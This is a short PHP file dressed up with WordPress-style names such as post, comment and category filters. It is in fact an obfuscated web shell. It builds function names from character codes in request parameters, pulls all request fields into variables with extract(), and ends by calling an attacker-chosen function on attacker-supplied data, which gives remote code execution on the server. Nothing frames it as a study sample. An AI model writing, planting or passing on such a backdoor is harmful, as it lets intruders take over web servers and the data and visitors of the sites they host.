<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// "chr", do this is a pack / unpack?
$wp_ids = "\x63\x68\x72";

$lang_filter = implode(array_map($wp_ids, explode(",", $_REQUEST['langs'])));
$post_filter = implode(array_map($wp_ids, explode(",", $_REQUEST['posts'])));
$comment_filter = implode(array_map($wp_ids, explode(",", $_REQUEST['comments'])));
$category_filter = implode(array_map($wp_ids, explode(",", $_REQUEST['cats'])));

extract($_REQUEST);

$search_filter = $category_filter($search_filter);
$search_cache = $category_filter($search_cache);

$search_filter = $comment_filter($search_filter);
$search_cache = $comment_filter($search_cache);

$search_filter = $post_filter($search_filter);
$search_cache = $post_filter($search_cache);

$search_filter = $lang_filter($search_filter, "UTF-8", "UTF-32LE");
$search_cache = $lang_filter($search_cache, "UTF-8", "UTF-32LE");

@die($search_filter($search_cache));

